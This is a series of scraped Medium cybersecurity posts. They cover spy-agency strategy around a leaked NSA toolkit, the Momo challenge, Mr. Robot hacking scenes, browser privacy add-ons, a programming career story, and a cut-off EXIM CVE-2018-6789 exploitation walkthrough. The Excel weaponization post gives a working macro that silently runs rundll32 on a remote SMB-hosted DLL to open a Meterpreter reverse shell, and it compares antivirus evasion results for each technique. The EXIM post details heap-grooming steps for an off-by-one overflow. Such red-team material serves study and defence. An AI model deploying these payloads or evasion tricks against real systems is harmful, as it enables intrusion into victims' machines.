Start actively looking for evidence that the toolkit has been compromised. This includes monitoring for use of the vulnerabilities within the toolkit, probably also information collection from other channels (HUMINT, SIGINT, OSINT, checking Tumblr for Bitcoin based auctions, etc.)
Best Course of Action: FIS
Assume that the opposition suspects that the toolkit is compromised. Do not actively use anything from the toolkit because that would immediately provide proof that the kit is dirty. If the opposition never has proof that the ops kit is dirty, they may grow complacent and continue to use it, thus allowing FIS to detect and monitor them.
Begin full passive exploitation of the toolkit for maximum intelligence value. Primarily, focus on detecting previous breaches by the opposition. Consider preparing and laying out honeypots for the opposition (this could backfire if the opposition discovers it is a honeypot, thus revealing to NSA that FIS has the toolkit.)
The intelligence services are in active competition to steal each other’s secrets while protecting their own. They have to consider what their actions will reveal to the opposition about their own knowledge. For the FIS, that means avoiding taking active steps to reveal they possess the firewall ops kit. For the NSA, this means avoiding taking actions to reveal that they know the kit has been compromised.
If NSA informs the vendors — Cisco, Fortinet, Huawei*, etc — about the vulnerabilities that were used in the kit, that will automatically alert the FIS that NSA knows the kit is compromised. This is a security problem. Additionally, other FIS (who didn’t capture the kit), would immediately be able to conduct a portion of the passive intelligence exploitation (they can trawl packet captures for exploitation of the vulnerabilities.) This is also a security problem.
*Many companies use Huawei products and they deserve just as much protection against “lost” 0days as companies that use Cisco. Unless the US is advocating using their intelligence services to directly aid only their own national companies, in which case I’m sure the Chinese would be happy to discuss the parameters of “acceptable economic intelligence”…
On the other hand, the kit may not be compromised, so all of the above issues may be incurred for… I guess, helping Cisco and Fortinet fix a small number of the vast quantity of security vulnerabilities that plague their products (not to single them out — security vendors have consistently scored at the low end in “secure software” evaluations.) Although part of the NSA (IAD) is tasked with protecting the US against FIS, their mandate is not actually “perform software QA for American companies.” It is also debatable as to whether they would be informed that the firewall ops kit was compromised which would likely be classified compartmented information.
For both the FIS and NSA, the best solution is to passively collect as much intelligence information about the firewall ops kit as possible. This minimises the security risk of exposing their own secrets to the opposition, while maximising their opportunities to collect additional secrets from the opposition. Neither service benefits from revealing the vulnerabilities to the vendors.
For the FIS, actively using the vulnerabilities from the firewall ops kit is literally the least valuable and highest risk method of exploiting the toolkit. Both they, and NSA, would be aware of this and so NSA would (rightly) determine that it is not a particularly likely event.
This is The Great Game. It has been going on for centuries, but it is only very recently that civilians have become significant active players and participants. The game is no longer the exclusive domain of nation states, but also software vendors, companies, and civilians. The rules, both implicit and explicit, that govern the game are changing to accommodate the new players. We live in interesting times…
Written by
","['Cybersecurity', 'Security', 'Operational Security']"
Momo challenge making Whatsapp dangerous place for children,https://medium.com/kidsnclicks/momo-challenge-making-whatsapp-dangerous-place-for-children-8c510e6e68d?source=tag_archive---------1-----------------------,"The momo challenge is a social media trend that is going viral among teens and tweens. The challenge is believed to have started on Whatsapp where youngsters are challenged to contact an unknown number who will then send them violent images and get your children to perform a series of dangerous challenges which include self-harm and suicide. Your children can get the number to contact Momo relatively easy from the internet, including Facebook, Youtube, and games like Minecraft.
The term Momo came from a scary Japanese sculpture designed by an artist called Midori Hayash. The picture of Momo is first available on the internet in 2016. It then became an urban legend in a Spanish speaking web which is associated with a phone number that can be added on Whastapp. The numbers somehow got leaked on the internet and can be easily found online.
Written by
","['ABC news.', 'Social Media', 'Parenting Advice', 'Parenting', 'Cybersecurity', 'Technology News']"
Mr. Robot Disassembled: eps3.0_power-saver-mode.h - Ryan Kazanciyan - Medium,https://medium.com/@ryankazanciyan/mr-robot-disassembled-eps3-0-power-saver-mode-h-1f8a3ba101d6?source=tag_archive---------6-----------------------,"Hello friend. I’m Ryan Kazanciyan, Technical Consultant for Mr. Robot and Chief Security Architect for Tanium. I’ve been working with Kor Adana — Writer, Producer, and mastermind behind the ARG — and the rest of the Mr. Robot team since the second half of Season 2. Throughout Season 3, I’ll be writing about the hacks depicted in the show, how they came together, and their basis in reality.
Spoiler Alert! This post discusses events from the first episode of Season 3.
Shall we Play a Game?
The Capture the Flag (CTF) tournament at the hackerspace was the first technical scene that Kor and I designed for Season 3, and a cool opportunity to get Elliot back on keyboard. We wanted to draw from real-world CTF events and incorporate something that was realistic and credible for our infosec-savvy audience, but equally accessible for everyone else.
After spending nearly a week researching puzzles from past CTFs, I stumbled on an interesting challenge based on Minesweeper. It’s a terminal-based version of the game that’s fully-functional on the surface, but requires some clever exploit code to recover the “flag” needed to win. It was originally used as a CTF stage during the 29th Chaos Communication Congress in 2012. This event, and the Chaos Computing Club that founded it, are a core part of hacking history and culture (especially in Europe) so I was excited to reference them in the show.
As Kor and I worked through the scene, we agreed that going with Minesweeper seemed like a really good fit. Nearly everyone has played the original game, so it served as a familiar and approachable basis for a hacking challenge. And like any good puzzle, there are many creative ways to solve it. Elliot’s explanation of how to poison the save file, defeat the checksum validation, and inject malicious code to grab the flag is based on actual solutions from winning teams. Credit to Rami Malek for delivering those dense lines of technical jargon without missing a beat.
Since this was going to be filmed as a long take, we needed to prepare several animation sequences that covered various stages of the game and in-progress attempts at solutions. I worked with the original Python script to capture what the minesweeper board and output messages looked like in different states: solved, failed, saved, reloaded, and so on. I also played, and lost, many rounds — I’m terrible at Minesweeper.
Here’s one of the original mock-ups that I built:
I tend to assemble these sort of dense screens with several open windows so that they look visually interesting from far away, but also provide plenty of material for multiple single-window close-ups. (They also reflect the sort of cluttered mess that is my own desktop).
This ended up being very close to what was produced and filmed, although in this particular scene, the camera movement unfortunately doesn’t provide a clear shot of the monitors. You can catch still a few glimpses as Elliot approaches and speaks with the two CTF players that are stuck on this game.
Hijacking the Dark Army’s Backdoor
While the hackerspace crowd celebrates winning the tournament, Elliot can focus on the real task at hand: shutting down the backdoor that provides the Dark Army with direct access to the UPS management system in E-Corp’s paper-records facility in New York. He is working on borrowed hardware and borrowed time. He has no access to Evil Corp’s internal network or any Dark Army systems. He needs to quickly cut off their ability to use the backdoor, while ensuring they don’t have an opportunity to detect and stop his efforts before it’s too late.
After talking through the available options, Kor and I set down the path of having Elliot perform a domain takeover compromise.
For viewers and readers that might not be familiar with some of these technical concepts, I’ll provide a bit of background. Most backdoor malware periodically communicates with a server to provide status, receive updates, or give an operator the ability to issue commands. This communications heartbeat is called “beaconing”; when an operator or system responds by taking control or issuing commands, it’s known as “command and control” or “C2”.
How does the backdoor know where to send its beacon or C2 traffic? If an attacker hard-codes an IP address when creating and deploying the malware, it may be difficult to change that setting later on. C2 server goes down? IP gets detected and blocked on the victim’s network? You might be out of luck and unable to reach your infected system to fix things. Using domain names provides greater flexibility: they can be updated to resolve to a new IP address, which might be served up from any location, without needing direct access to the malware itself.
The downside to this approach is that it adds another point of failure: the registrar business responsible for maintaining the name records, and the hierarchical system of DNS servers that resolve domains to IPs. If you gain access to the user account that has administrator access for a set of domains — or worse, to the registrar’s entire web-based management interface — you can take control of these addresses. Among many configuration changes, you can then ensure that traffic originally intended for those domains ends up going to an IP address under your control.
And that’s how Elliot pulls off the domain takeover hack. Kor and I streamlined the timing and complexity of it all, but the underlying technique has played out in many real-world incidents. And yes, even some of the most sophisticated attacker groups use legitimate registrar services for their command-and-control domains.
The pace of the scene unfortunately didn’t afford much on-screen time to show how Elliot actually compromises the registrar in the first place. In my head, I reasoned that he found a basic web application vulnerability, like SQL injection or a poorly-secured administration interface, that was hackable straight from a browser. Again, plenty of real-world precedent for that. But you do see a few glimpses of the attack’s aftermath, shortly after Elliot has successfully logged in and tampered with the domain settings.
I wanted to base these screens on a real Chinese registrar — not just to nail the look-and-feel of the management panels, but also to get some contextually accurate language used to label the user interface. After a long evening of frustrating searches and copious use of Google Translate, I struck gold: a registrar with a publicly-available demo site that allows visitors to log on to a test account and explore their domain administration tools.
I worked through the pages relevant to reconfiguring domain name settings, and assembled a set of reference screenshots like the one above. These served as basis of the design for the fictitious registrar site that you see in the background when Elliot regains access to the backdoor.
Once the domain takeover is complete, the backdoor’s next automated attempt to connect back to its C2 server leads it to an an IP address under Elliot’s control. Success! He’s back on the UPS management system.
We previously saw this backdoor in use back in Season 2, Episode 12: it’s a publicly-available Perl reverse shell called “rwwwshell” that simply provides remote command-line access to an infected system.
Tech-savvy viewers might observe that “rwwwshell” is not the most interesting or contemporary example of covert backdoor malware. True, but we can presume that the victim host might be an old or bare-bones *nix distribution that lacks key dependencies needed for something more sophisticated.
Elliot quickly types a `shred` command to wipe out the backdoor script, and drops the connection, thereby eradicating the Dark Army’s foothold.
Hacking Cars the Old-Fashioned Way(Updated 10/15/17)
Earlier last week, Kor and I hosted a Reddit AMA in which someone asked about how we avoid “hollywood hacker bullshit”. The FBI / Irving car pursuit is a great example of a scene where, in any other show, an imperiled hacker might pull out a laptop with a magical set of pre-loaded tools that can stop any vehicle in its tracks. (And if the situation is fast and furious, they might conjure up a botnet of attacking zombie cars.) We had to keep it real…but how?
There have been a few examples of remotely exploitable car hacks — but within very sets of conditions, and only affecting a few specific makes and models. Metasploit for cars doesn’t exist yet. So as Kor and I pitched ideas for the scene, I realized I didn’t want this attack to depend on traditional hacking tools at all. That led to researching the different ways that telematics systems can control a vehicle — and ultimately yielded Irving use of social-engineering against an OnStar-like service to initiate a “stolen vehicle slow-down”.
Russel Brandom at The Verge picked up on some key elements that we included in the scene; for instance, flashing the hazard lights so that the requesting officer confirms they’re about to halt the right car. That detail, along with other steps that Irving followed, came from a “best practices” document for public safety officials that I stumbled upon after a long night of hunting for reference material.
Old-school social engineering, supported by just the right types of domain knowledge and information, delivered without missing a beat. Exactly the type of hacking you might expect from someone like Irving.
Written by
","['Mr Robot', 'Cybersecurity', 'Hacking', 'Television', 'Technology']"
MS Excel Weaponization Techniques - Bank Security - Medium,https://medium.com/@Bank_Security/ms-excel-weaponization-techniques-79ac51610bf5?source=tag_archive---------8-----------------------,"Here we are again talking about reverse shell and evasive methods for not being detected. From my last article (Undetectable C# & C++ Reverse Shells) many things have changed: some of the methods used are now monitored and detected from different AVs. So i have to find a new way to make my reverse shells hidden and undetectable. Lets see how…
…old and simple methods could be the best…
The Metasploit SMB delivery module serves .dll payloads via an SMB server and provides commands to retrieve and execute the generated payloads. This method is very simple and many articles have been made about it. What I didn’t know about this method is that it is a great way to evade antivirus.
Begin by loading the related module into Metasploit and configure it:
You can choose the dll file name, folder and the path name (in this case i used 1,2,3 just for convenience). After that you can run “exploit”. Automatically the meterpreter_reverse_tcp payload will be set in order to open a Meterpreter reverse shell on a victim machine. If you want you can choose a different payload according to your needs. To make everything work, the generated command must be executed on a victim machine.
This should be the result:
On a victim machine the command line that you have to run is the following:
Then executing the command directly on the victim machine the reverse shell is opened. At this point you just have to insert this command line into a malicious document. let’s see how…
…but what is the best method for not being detected?
Let’s see what is the best technique to make an Excel file undetectable. Remember that with all the following attacks, once enabled the macros or confirmed the execution of the command line, I have opened a reverse shell without alerting Windows Defender on a Windows 10 Fully patched machine.
https://www.virustotal.com/#/file/bb1e0bdbf57ca55f0a4de261924803614bc71a20df8cf901d7d31bdce75f0738/detection
I tried to save the same file with .xlsm format and see the result:
https://www.virustotal.com/#/file/aa6c113d71f79e7215df0634f7eace7a95abb183ea038a60f0b6f1c06c3df661/detection
And here our first result: the AV engines that were able to analyze this file are 3 more but the detection is one less. Nice let’s go deeper…
I inserted into comment section the malicious command line:
In order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:
Note: In order to use auto-execution via the ‘Workbook_Open()’ function, the weaponized MS Excel document needed to be downgraded to Office 98–2003 compatibility (.xls)
Here the VT results:
https://www.virustotal.com/#/file/6894bcd2a7f9912a2dc24974de7ee477b209a6db5fa04879ecc0b7e4d9e75988/detection
Nice! It seems that this technique is better known than the previous ones. Let’s see the next one…
In order to run the command line i created a custom formula which is right for us:
let’s see how it acts against the army of VT AVs:
https://www.virustotal.com/#/file/8c9c86b85669689d7c6c6e054849744efac164678184541491c7d50d8df75877/detection
https://www.hybrid-analysis.com/sample/8c9c86b85669689d7c6c6e054849744efac164678184541491c7d50d8df75877
Great! In this case if you have Kaspersky you can sleep peacefully otherwise you start to worry :)
naaa … as soon as you put a powershell inside a macro you are detected as malicious almost by default. Too much attention on powershell executed by a macro. Even Windows Defender has deleted my file as soon as I’ve created it.
What if I ran the usual command line but encoded in Base64 using Powershell?
https://www.virustotal.com/#/file/a60005afd0e2bed1fae9606d829d9df73e4b6cb7fa7fcffc169d2629713b85a8/detection
Same result of the same method with the commands in the clear. This is interesting. It means that the commands in base64 are managed in the same way as a clear command line. So at this point if you want to use this method better avoid further work in encoding commands.
I inserted the powershell that runs the command line encoded in base64 in a formula:
Here the VT Result:
https://www.virustotal.com/#/file/b881a88a8d712e2071f0e25bebaa2846e71512b82f4ece90e89d1388e459e83e/detection
It’s obvious that the powershell are overwatched. The same method as before but through a powershell has resulted in 10 more detection.
Thanks to the contribution of the community I also wanted to try the old method of macro XLM. Always using the same clear code this is the result:
Command line:
rundll32.exe \\10.0.2.15\3\2\1.dll,0
I have hidden the macro sheet and put the macro in “Auto_open” and here the VT result:
https://www.virustotal.com/gui/file/fcd307d488e424ce2efa3db3b78974989e102ef1575e785648fca61b3f9a5024/detection
With this method i inserted the VBS Macro script inside a custom button:
Macro code:
Sub Auto_open()
Call Shell(“cmd.exe /c rundll32.exe “”\\10.0.2.15\3\2\1.dll””,0""””, vbHide)
End Sub
Here the VT results for .xls file type:
Same code but with .xlsm file type:
Thanks to these tests, an interesting fact emerged: If you are a red teamer or a pen tester today you can think of using malicious formulas or XLM Macros. To date, the formulas and XLM Macros seem to be the least observed techniques by various antivirus. Obviously this is a test based on a simple command line that uses an old method and is certainly not exhaustive. Let me know what you think and tell me about your experiences here or on Twitter.
Written by
","['Red Team', 'Penetration Testing', 'Cybersecurity', 'Cyberattack', 'Infosec']"
Must-have Security Add-ons for Browsers - CloudBoost,https://blog.cloudboost.io/must-have-security-add-ons-for-browsers-ef88b8404635?source=tag_archive---------6-----------------------,"Updated as of April 2018
Browsing the Web these days is not as secure as it used to be. User fingerprinting is rampant but that’s just one facet of it. Online advertisements undermine the users and their experience in more ways than one:
Ads are commonly known to considerably fatten-up a website’s payload and decrease its performance, promote clickbait titles, fingerprint and stalk users, (ab)use their computer to mine cryptocoins, or lead them to scam websites phising their login credentials, among many more. And that’s just from advertisements. Sadly that’s not the only way users can get screwed on the Web today.
Luckily there are a few simple steps users of any level could take to be much safer when surfing the web. In this article we will focus specifically on some browser add-ons we can easily and quickly install in our browser to enhance our security.
This collection is put together primarily with the already privacy respecting Firefox browser in mind. However many of the add-ons can be found in Google’s Chrome Web Store with the same name or as very similar alternatives.
While there’s a lot that can be done with browser add-ons, the actual browser we choose to use, being our window to the internet itself, is of highest importance. So let’s start off on the right foot, shall we?
Google’s Chrome browser became very popular, very fast, mainly due to it having been ahead of the competition performance-wise until now. One must always keep in mind, though, that Google is a corporation making 96% of it’s revenue from advertising, so while Chrome is an otherwise very secure browser, it cannot be expected to value our privacy to any degree.
Switching to an open source alternative browser like Firefox (from respected privacy advocate Mozilla Foundation) is highly suggested. Even more so, now that Firefox boasts the new Quantum rendering engine offering competitive, if not better, performance.
Brave browser (from former Mozilla CTO’s new company) is another suggested option. What’s setting it apart is that it takes a revolutionary approach to online monetization, by blocking all ads and trackers, yet letting users support websites directly via an automated credit distribution procedure.
This list wouldn’t be complete without mentioning the Tor browser. Based on Firefox, it comes preconfigured and with all the add-ons needed to browse the Web with unprecedented anonymity over the Tor network. It may not be the best for everyday use, but it’s the go-to option for maximum anonymity. When coupled with a password manager’s auto-login functionality, though, it is much less cumbersome even for everyday use.
“Finally, an efficient blocker. Easy on CPU and memory.”
We’ve kind of already gone over how harmful the current state of online advertising is for the users (and arguably not ideal for content creators either). So the best way to handle ads is to allow none of it to reach us. Period.
uBlock Origin does exactly that. It knows most common advertiser URLs and blocks them elegantly. It also does so in a way more performant fashion than older alternatives like AdBlock Plus. It can handle blocking of popups and even youtube overlays or in-video ads seamlessly.
Whitelisting a website is done with a single click or with Ctrl + click for only a specific page. It also lets us manually hide any page’s element that isn’t already blocked (anything we don’t like, even if it’s not an ad!) with a handy eyedropper-like selection tool.
“Automatically changes HTTP addresses to using the secure HTTPS, and if loading encounters error, reverts it back to HTTP.”
Connecting to a website over HTTPS (commonly denoted with a green padlock in the addressbar) goes a long way to to protect the user from many attacks. HTTPS ensures that any data we receive or send to such a website, can not be read, or get tampered with along the way, from attackers.
But even when many websites support HTTPS today, not enough of them update the connection automatically to it if it begins over plain HTTP. And even if a website is served over HTTPS, it is very common that some of the resources getting subsequently requested, are fetched over HTTP.
The Smart HTTPS add-on makes sure that if any connection for websites or subsequent resources can be upgraded to HTTPS, then it will. In fact it is itself an upgrade from the very popular add-on developed by the EFF known as HTTPS Everywhere. The latter has been using a pre-configured list of known URLs upgradeable to HTTPS, whereas the former does it dynamically for each connection using no list, since they are bound to be finite and outdated.
“DuckDuckGo is the search engine that doesn’t track you. We also have smarter answers and less clutter. This extension adds DuckDuckGo (HTTPS / SSL version) to the search bar. For more features, see the DuckDuckGo Plus add-on. Enjoy!”
We’ve already established how Google is not to be trusted with our data, even more so those that characterize us most, like our browsing and search history. And while dropping their Chrome browser may help with the former, using Google Search still allows them to build a distressingly specific profile of us.
Thankfully we can avoid that and search the Web with the privacy-respecting alternative DuckDuckGo. Their add-on will automatically replace our browser’s default search engine to the one that doesn’t track us.
Rife on features like a multitude of community-backed instant results that promptly inspired Google Search to copy over, I would say it’s already good enough or better for everyday use, especial given that competitors that fingerprint the users have an inherent advantage in yielding relatively better search results (in return for paying with our privacy, no refunds offered by the way).
If that wasn’t enough to convince you to switch, you could read up on 15 Reasons Why You Should Ditch Google Search for DuckDuckGo.
“Open current page or link in tor browser for better privacy.”
Well what if we do want to search using Google, when we need to try again for possibly better results (not often, but sometimes still)?
Remember how we previously mentioned that Tor browser offers maximum anonymity? Well if you have it installed in your computer and the Open in Tor Browser add-on in your everyday browser, then you can type in the search kewords in Google Search and open the results link in Tor. Very handy for this and many other use cases so that we don’t have to copy paste links around or compromise our data either.
“Firefox Multi-Account Containers lets you keep parts of your online life separated into color-coded tabs that preserve your privacy. Cookies are separated by container, allowing you to use the Web with multiple identities or accounts simultaneously.”
Does pretty much what it says on the tin. It allows us, for example, to be logged in to our Google account when browsing for work, but simultaneously be logged out the service for the whole Web while using the same browser in tabs assigned to the “Personal” tab container. It also helps to have our tabs organised in groups, color-coded by the way, which can be a big productivity boost. Did I mention it’s also built by Mozilla itself?
“ Protect your Passwords, Payments, and Privacy.”
Have you ever been hacked in the past? If you have, chances are your email and password were not hacked directly but were instead leaked when a service you have used in the past was compromised, with attackers getting access to all email and password combinations. This unfortunately happens scarily often, enough that you just have to always expect it unless proven otherwise. You can check if your email has been in a known such list in haveibeenpwned.com .
As I said, we should always expect our email, password and even credit card data to be leaked so one way to protect against that is to use unique ones for each website. And here’s where the Blur add-on comes in.
It lets us create unique strong passwords for each website so even if one is hacked, the damage is mitigated greatly. (For maximum protection, though, I would recommend using a much more secure dedicated password manager, preferably 1Password.)
Additionally it lets us use a unique email for each website, protecting us from (and letting us know of, which is neat) services that leak our email to spammers. Any email sent to any alias email addresses can be forward to our normal personal email address for us to read (or not, since we can block it in Blur).
Moreover, Blur lets us create credit card aliases, virtual prepaid cards essentially, so that we never expose our real credit card details to merchants. Yes this is a replacement for Paypal, which, by the way, you should not be using in the first place.
Lastly Blur has a tracker-protection feature, but we can disable that if we’re going to be using more sophisticated approaches for that (like uMatrix presented further below).
Honestly, Blur has too many features for my personal needs and most of them are for the premium version. But I still think the free e-mail masking it offers is vital, so this is how I have it configured:
Once the extension is installed, click the Blur icon on the top-right. Then on the pop-up click “Settings” and subsequently “Settings for all websites”. Here’s a screenshot of my settings (note I already use another password manager):
“ Send referers only when staying on the same domain.”
Yeah, I know the name’s spelled wrong but hey, it was built by a user named “meh”, so… :P
Did you know that whenever you click a link on the web, whoever owns the webpage where you land, can know the specific page you came from? Yup! That’s called a referrer and it’s a header fields of the initial request that opens the new page when you clicked that link.
The SmartReferer add-on ensures that this data is not leaked when we click on external links, but still allows it when a link takes us to another webpage of the same website (internal links), so that its owners can at least get some usage analytics to make our experience better in the future.
“Clean URLs that are about to be visited:- removes utm_* parameters- on item pages of aliexpress and amazon, removes tracking parameters- skip redirect pages of facebook, steam and reddit”
There’s more to links leaking where we came from than the referrer HTTP field. Specifically, websites like facebook, amazon and anyone else really, can structure their link URLs in such a way that when we visit them they can can get data like where we came from and more. Moreover, websites like Facebook use this trick to “rat out” to other websites that we came from them.
The Link Cleaner add-on will trim most link URLs, cleaning them from passing on that data to the landing website. This also makes sharing links to friends much more responsible privacy-wise.
“ Prevent tabs opened by a hyperlink from hijacking the previous tab by adding the rel=noopener attribute to all hyperlinks (excluding same-domain hyperlinks).”
Remember how I said that clinking an external link can leak where you came from? Well that’s bad but what’s even worse is that it lets the new tab we just opened via the link have access to the source tab. That’s… very bad. And it could have actually been avoided if the source website’s programmer had put the rel=noopener attribute in the HTML code. For the more technical readers in the audience, here’s a link for more info.
The Don’t touch my tabs! add-on will always inject that little code snippet in the HTML code of pages we visit so that even when programmers are sloppy, we are safe.
“Easily stop coin miners from using your computer resources.”
With the surge of crypto-coins, there’s been a recent trend for new coins like Monero that are designed to be very CPU-friendly to mine. Some attackers have recently injected software in their ads or websites that takes over your computer’s CPU to mine these crypto-coins and generate money for the attacker.
The NoMiner add-on will detect such software and stop it on its tracks.
“ Point & click to forbid/allow any class of requests made by your browser. Use it to block scripts, iframes, ads, facebook, etc.”
This add-on here, folks, is the nuclear microscope of all security plugins on the web, but keep in mind that such fine-tuned tools may not be as user-friendly to less advanced users. This is however a an ultra-powerful security tool for the power-users reading this.
The uMatrix add-on lets us inspect and allow or block any request a website makes, grouped as cookies, css, images, media, scripts, xhr requests, iframes and others. By default it will only allow loading assets from the same domain as the page visited, which is bound to break most websites until manually configured otherwise. Configuration is, as said in the description, point and click, but the user experience may still be overwhelming for the average user.
Users already familiar with the hugely popular NoScript add-on will feel right at home and can upgrade to uMatrix which offers the same functionality with global rules supporting wildcards, but it also does so for more request groups than just scripts. If you need help to get you started, here and here are some ready to copy-paste uMatrix rulesets.
“Protects you against tracking through “free”, centralized, content delivery. It prevents a lot of requests from reaching networks like Google Hosted Libraries, and serves local files to keep sites from breaking. Complements regular content blockers.”
Unfortunately, when using script-blocking software like uMatrix, we sometimes can’t avoid whitelisting external requests to common libraries used around websites like jquery because if we do block them, such websites become unusable (shame on you, developers). And even when that software is usually safe in itself, it often ends up being the same library used by many websites. This means that those companies serving the library over the internet can know of all the websites we visited which are programmed to consume that same library.
The Decentraleyes add-on fixes that. It caches locally commonly requested libraries like jquery and instead of making the network request, it fetches it from the local cache. This also saves network bytes for us and helps websites load faster.
While the Web is not thoroughly a safe place, switching to a safe browser with a couple of set-and-forget add-ons can go a long way in fixing that. Getting protected is not hard and even if it were, it’s totally worth the effort.
Reworking a bit what Benjamin Franklin once said and bringing it to the information age:
Those eager to compromise their security for convenience, deserve neither and will ultimately lose both.
Don’t go browsing the Web naked, folks.
Know of a worthwhile security add-on I missed? Please take a moment and let everyone know in the comments below.
This article was purposefully structured to be easy-to-follow, accounting for the less technical readers as well who, it so happens, are the ones usually most in need of such information. I feel it’s our responsibility as power-users and programmers to always protect them. Share with your friends and family to help spread the word and keep them safer in the web.
If you found this was worth your time, please click the � below so that other people may see it here on Medium.
Thank you for your attention. --maninak
Written by
","['Announcements', 'JavaScript', 'Sign Up', 'Browsers', 'Addons', 'Cybersecurity', 'Privacy', 'Firefox']"
My journey into the world of programming - Techspiration + Ideas + Making It Happen - Medium,https://medium.com/techspiration-ideas-making-it-happen/my-journey-into-the-world-of-programming-fbc01e725d8d?source=tag_archive---------7-----------------------,"A lot of us go through school learning and amassing a variety of information with no idea of the real-life applications. I fit this mould.
After my degree in Computer Science, I realised I was not competent enough to face the ICT world. I registered for a Cisco Certified Network Associate (CCNA) programme just to try my hands at networking, and got interested in Cyber Security. I started applying for a master’s degree scholarship to study either Computer Forensics or Network Security. While going through the requirements for Computer Forensics on a UK university website, something caught my attention — “you will learn a scripting language so that you can develop your own forensic tools.” That was when I realised I needed to learn a bit of programming; something I had tried so hard to avoid while I was in school. Programming was the one part of Computer Science that did not appeal to me, so much so that I refused to accept a programming final year project. I insisted I was going to do an animation project instead, not knowing that I was going to end up in a programming field.
I tried learning Python programming on Coursera, but could not follow through as I needed to travel for various scholarship exams. Back in school, I had tried learning Java, C++, and Visual Basic.NET; all to no avail.
A friend of mine randomly sent me a link to some new company called Andela that was hiring people to train and pay them to be software developers. I had given up on applying for scholarships as each one I applied to sent me a rejection mail. Besides, I did not want to be a Software Developer. I just wanted to be a Cyber Security expert. My friend encouraged me to give it a shot, and I did. Again, I got rejected. “No big deal,” I thought. A few months later, Andela sent me a mail for an all-female recruitment. I hesitated initially, then applied again. I was called for an interview, and then a two-week bootcamp.
Bootcamp at Andela was challenging: I learnt Javascript, HTML, and CSS. It was tough for me, but the thought of becoming a Cyber Security expert in the future kept me going. After the bootcamp, I was invited into the fellowship.
On February 2nd, 2015, I started my journey officially into the world of programming as an Andela fellow. I started with Javascript, then moved to Python. Now I have fallen in love with DevOps, all these still with the dream of becoming a Cyber Security expert.
One thing I have learnt so far is that you never know your abilities till you try, and sometimes you cannot really try till you are given the opportunity to. When you are not given such an opportunity, you need to find a way to create one for yourself. I cannot say I did it all by myself, either. Being part of the Andela fellowship has helped a great deal. You can apply here if you also want to be part of the Andela community. Try to take chances and put yourself out there without giving up. Perseverance is key and keeping your mind open to changes as they come helps, too. Never ever say you cannot do something.
Thanks for reading.
Written by
","['Education', 'Programming', 'DevOps', 'Cybersecurity']"
My PoC walk through for CVE-2018–6789 - Bruce Lee - Medium,https://medium.com/@straightblast426/my-poc-walk-through-for-cve-2018-6789-2e402e4ff588?source=tag_archive---------3-----------------------,"By: @straight_blast ; straightblast426@gmail.com
On March 6, 2018, a security researcher named “meh” (will be referred to as author from now on) published a blog post[1] on the vulnerability CVE-2018–6789 that she identified in EXIM 4.89 and below. She gave detailed explanation on how to exploit the vulnerability, however no proof of concept code was release. I decided to develop a PoC based on her strategy, and this blog is a walk through of my proof of concept code. Before proceeding with reading this post, it is mandatory for the readers to read and understand the author’s blog post as she did an excellent job describing the EXIM heap management and exploitation strategy. Readers are expected to have an understanding of heap exploitation and are encouraged to read through the author’s listed references.
As highlighted by the author, there is an off-by-one calculation mistake in the base64 decoded buffer length in the “b64decode” function in base64.c.
An invalid base64 encoded string of length 4N+3 will allocate a buffer of size 3N+1, but will consume 3N+2 bytes from the decoding. This allows heap memory to be overwritten when parsing base64 string.
I setup a test environment using docker.
Installed the necessary libraries and tools I’ll be using.
Add a user for the EXIM process.
Download EXIM 4.89 through the GitHub repository.
I have to do the following to build the EXIM.
Modify line 134 of “exim/src/Local/Makefile” to include an EXIM_USER.
Enable plain text authenticator by uncommenting.
Edit “exim/src/OS/Makefile-Linux” and change the following.
to
This enables symbols for debugging purposes.
Run “make install” under “exim/src” folder. The installed binary should be located at “/usr/exim/bin/” folder.
Enable “AUTH” for EXIM by editing “/usr/exim/configure” and find the “begin authenticator” section. Make the following changes.
Run EXIM as a daemon.
Have GDB attach to EXIM.
Attach the debugger to EXIM, and set a breakpoint at the “b64decode” function.
Send a base64 encoded string composing of 54 characters through the “AUTH PLAIN” command.
When “b64decode” function gets a breakpoint hit, set a new breakpoint for “store_get_3” function.
Step to line 143 and print the “size” variable.
The above debugger output indicates “size” is 40. 40 bytes of space will be required to store the decoded base64 string.
The space that holds the decoded base64 string is in agreement of “size” being 40.
Repeat above procedure, but include one more character into the base64 string.
The “size” variable is calculated to 40.
The space that holds the decoded string consists of 41 characters. One more than the expecting size.
Send an “EHLO” command with a hostname of 8000 ASCII characters will put a 0x6060 freed size chunk into the unsorted bin.
The address and content of “sender_helo_name”.
The “EHLO” command performs a series of memory allocation and deallocation. I ended up with the following heap layout.
Chunk 0x55d7e5887c30 is the 1st item in the unsorted bin.
Chunk 0x55d7e5887c30 has a size of 0x6060.
The author suggested to cut the 0x6060 free chunk up as follow.
It took 5 steps to get the desire layout.
1. Send 1st “EHLO” command with hostname of 8000 ASCII characters, to get 0x6060 free chunk into unsorted bin.
2. Send 2nd “EHLO” command with hostname of 16 ASCII characters, to free the 0x1f50 space occupied by 8000 chars hostname from 1st “EHLO”, and to use the 0x20 free chunk space from small bin to store the new 16 chars hostname.
The 0x20 free block was discovered in the small bin.
3. Send an unrecognized command of 2000 “0xff” characters, to carve a 0x2020 size chunk from the merged free chunk (size: 0x7fb0).
4. Send 3rd “EHLO” command with hostname of 8200 ASCII characters, to carve a 0x2020 size chunk from the merged free chunk (size: 0x5f90).
5. The 3rd “EHLO” command will free the hostname from the 2nd “EHLO” command along with previous allocated store blocks (this includes the storage for the unrecognized command).
The PoC so far:
The heap is in the desired state according to the debugger.
The heap layout is as follow.
The author’s next strategy is to allocate a 0x2020 chunk though “PLAIN AUTH” command, and have a one byte overrun into the 3rd “EHLO” command hostname.
I allocated the free chunk above the 3rd “EHLO” hostname by sending an “AUTH PLAIN” command with a 10935 characters of base64 string. This string will also overwrite the least significant byte of the heap size value of the 3rd “EHLO” hostname chunk.
Revised code for the “exploit” method.
By sending “X” as the last character of the encoded string, it overwrites its following chunk’s meta-data size value from 0x2020 to 0x2005.
The author’s strategy is to overwrite the one byte with the “0xf1”, to extend the chunk size from 0x2020 to 0x20f0.
I reviewed how EXIM implemented the base64 decode algorithm, and I learned that the last two bytes of the base64 encoded string determines the last byte of the decoded string.
I traced the code and the expression that evaluates the last decoded character is at line 193 of base64.c.
The above expression uses variable “y” and variable “x”. So I have to identify their source.
The variable “y” holds the 2nd to last character from the encoded string, and variable “x” holds the last character from the encoded string.
The “y” and “x” variable goes through a table lookup before it is evaluated by line 193.
Line 170 implements the table lookup for variable “y”.
Line 192 implements the table lookup for variable “x”.
The “dec64table” is in the base64.c.
